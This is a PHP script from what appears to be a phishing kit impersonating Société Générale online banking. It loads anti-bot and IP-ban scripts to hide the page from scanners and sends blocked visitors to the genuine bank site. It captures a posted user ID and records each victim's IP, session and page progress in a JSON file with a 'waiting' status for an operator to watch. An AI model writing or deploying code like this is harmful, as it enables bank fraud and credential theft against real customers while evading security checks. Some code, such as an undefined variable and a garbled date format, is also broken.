<?php
error_reporting(0);
set_time_limit(0);
session_start();
include ('../prevents/bots.php');
include ('../prevents/antimar.php');
include ('../prevents/banned-ip.php');
	include ('../prevents/anti1.php');
	include ('../prevents/anti2.php');
	include ('../prevents/anti3.php');
	include ('../prevents/anti4.php');
	include ('../prevents/anti5.php');
	include ('../prevents/anti6.php');
	include ('../prevents/anti7.php');
	include ('../prevents/anti8.php');

header('Content-type: text/html; charset-UTF-8');
include('./inclu/para.php');
include('./inclu/bots.php');
//include('./inclu/banned-ip.php');
date_default_timezone_set('GMT');
$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
$url = $_SESSION['url'];
$ip = getenv("REMOTE_ADDR");

$idClient = $_POST['user_id'];



if($hhh){
  if($hhh['bloque'] == 1){
    header("Location: https://particuliers.societegenerale.fr/restitution/cns_listeprestation.html");
    exit;
  }
}else{

}


$ip = $_SERVER['REMOTE_ADDR'];
$vid = isset($_SESSION['vid']) ? $_SESSION['vid'] : uniqid('vid_');
$_SESSION['vid'] = $vid;

$filepath = 'active_users.json';
$users = file_exists($filepath) ? json_decode(file_get_contents($filepath), true) : [];

$currentPage = basename($_SERVER['PHP_SELF']);

$users[$ip] = [
    'vid' => $vid,
    'first_seen' => $users[$ip]['first_seen'] ?? time(),
    'last_seen' => time(),
    'last_page' => $currentPage,
    'status' => 'waiting'
];

file_put_contents($filepath, json_encode($users, JSON_PRETTY_PRINT));


?>
